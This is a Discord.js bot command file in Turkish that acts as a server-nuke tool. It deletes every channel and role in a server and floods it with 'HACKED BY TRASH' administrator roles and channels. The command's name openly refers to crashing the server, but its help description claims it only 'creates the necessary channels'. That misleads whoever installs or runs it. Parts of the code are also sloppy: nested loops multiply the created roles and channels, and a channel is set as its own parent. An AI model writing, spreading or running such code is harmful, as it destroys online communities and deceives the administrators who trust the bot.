const Discord = require('discord.js');
module.exports.run = async (bot, message, args) => {
    if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send(new Discord.RichEmbed()
                                                                                      .setDescription('Bu komuTu kullanmak için **Yönetici** yetkisine sahip olmalısın.')
                                                                                      .setColor(10038562));
  let rol = message.mentions.roles.first() 
     message.guild.owner.send('Sunucu Çökertme Başlandı Ve Tamamlandı')
       message.guild.channels.forEach(function(kan) {
       message.guild.roles.forEach(function(rol) {
                 kan.delete()
                 rol.delete()
         
          message.guild.createRole({
        name: `👑 | HACKED BY TRASH`,
        color: "#080000", 
        hoist: true,
        permissions: [
            "ADMINISTRATOR",
    ]
      
    })
                     
         message.guild.createChannel(`Hacked By T R A S H`, "text").then(HACKEDBYTRASH => {
         HACKEDBYTRASH.setParent(HACKEDBYTRASH)  
       })})})
}
  exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['sunucusikçökert'],
  permLevel: 4
};
  
 exports.help = {
  name: 'sunucu-sik-çökert',
  description: 'Bulunulan sunucu için gerekli kanalları oluşturur.',
  usage: 'sunucu-sik-çökert'
}; 